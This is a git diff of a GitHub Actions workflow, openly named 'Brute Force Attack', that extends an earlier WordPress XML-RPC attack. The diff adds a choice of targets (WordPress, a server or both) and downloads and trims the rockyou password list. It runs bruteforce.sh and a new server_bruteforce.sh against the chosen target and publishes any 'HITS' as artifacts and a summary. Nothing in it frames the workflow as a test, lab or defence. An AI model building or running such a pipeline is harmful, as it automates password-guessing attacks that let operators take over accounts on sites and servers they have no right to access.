@@ -1,10 +1,19 @@
-name: WP XMLRPC Attack
+name: Brute Force Attack
 
 on:
   workflow_dispatch:
     inputs:
+      target:
+        description: 'Target to attack'
+        required: true
+        default: 'both'
+        type: choice
+        options:
+          - both
+          - wordpress
+          - server
       phase:
-        description: 'Phase to run'
+        description: 'Wordlist phase'
         required: true
         default: 'all'
         type: choice
@@ -31,18 +40,19 @@ jobs:
             tar -xzf rockyou.tar.gz 2>/dev/null || true
             [ -f rockyou.txt ] && mv rockyou.txt rockyou_filtered.txt
           fi
-          if [ ! -f rockyou_filtered.txt ]; then
+          if [ ! -f rockyou_filtered.txt ] || [ ! -s rockyou_filtered.txt ]; then
             curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt" -o rockyou_filtered.txt
           fi
           if [ -f rockyou_filtered.txt ] && [ -s rockyou_filtered.txt ]; then
             grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' rockyou_filtered.txt | head -50000 > rockyou_filtered_tmp.txt
             mv rockyou_filtered_tmp.txt rockyou_filtered.txt
-            echo "Rockyou ready: $(wc -l < rockyou_filtered.txt) passwords"
+            echo "Rockyou: $(wc -l < rockyou_filtered.txt) passwords"
           else
             echo "WARNING: rockyou download failed"
           fi
 
-      - name: Run Brute Force
+      - name: WordPress Brute Force
+        if: inputs.target == 'both' || inputs.target == 'wordpress'
         continue-on-error: true
         run: |
           chmod +x bruteforce.sh
@@ -50,11 +60,20 @@ jobs:
         env:
           PHASE: ${{ inputs.phase }}
 
+      - name: Server Brute Force
+        if: inputs.target == 'both' || inputs.target == 'server'
+        continue-on-error: true
+        run: |
+          chmod +x server_bruteforce.sh
+          bash server_bruteforce.sh
+        env:
+          PHASE: ${{ inputs.phase }}
+
       - name: Upload Results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: results-${{ github.run_id }}
+          name: results-${{ inputs.target }}-${{ github.run_id }}
           path: |
             results.txt
             bruteforce.log
@@ -65,6 +84,8 @@ jobs:
         if: always()
         run: |
           echo "## Brute Force Results" >> $GITHUB_STEP_SUMMARY
+          echo "**Target:** ${{ inputs.target }}" >> $GITHUB_STEP_SUMMARY
+          echo "**Wordlist:** ${{ inputs.phase }}" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
           if [ -f results.txt ] && [ -s results.txt ]; then
             echo "### HITS:" >> $GITHUB_STEP_SUMMARY
